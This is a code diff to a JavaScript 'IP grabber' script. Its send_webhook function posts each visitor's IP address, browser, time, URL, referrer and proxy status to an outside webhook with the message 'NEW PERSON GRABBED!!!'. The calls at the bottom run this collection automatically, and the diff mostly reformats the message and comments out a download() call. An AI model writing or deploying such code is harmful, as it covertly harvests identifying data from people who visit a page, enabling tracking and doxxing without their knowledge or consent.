@@ -57,7 +57,7 @@ async function send_webhook() {
       "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      content: `@everyone NEW PERSON GRABBED!!!\nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nProxy: ${proxy}\nMade by K.Dot#4044`
+      content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nIP: [${get_ip()}]\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\nProxy: ${proxy_check()}\n[Made by K.Dot]\n\`\`\``
     })
   });
 }
@@ -69,4 +69,4 @@ function download() {
 
 send_webhook();
 proxy_check();
-download();
+//download();
